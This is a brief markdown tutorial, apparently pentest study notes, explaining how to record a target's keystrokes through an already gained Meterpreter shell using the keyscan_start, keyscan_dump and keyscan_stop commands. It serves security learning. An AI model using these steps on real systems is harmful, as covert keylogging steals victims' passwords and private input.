# Keylogging using Meterpreter
Keylogging is the process of recording the key strokes entered by a user on the target system and sent it back to the attacker.
We can perform keylogging using a command in Meterpreter.

#### KEYLOGGING PROCESS:

1. Gain an initial Meterpreter shell 
2. Then start the Keylogging using
```
keyscan_start
```
3. This will now start the keylogger in target and records all the data entered.
4. We can the view the recorder keystrokes using
```
keyscan_dump
```
5. Finally we can stop the Keylogger using
```
keyscan_stop
```
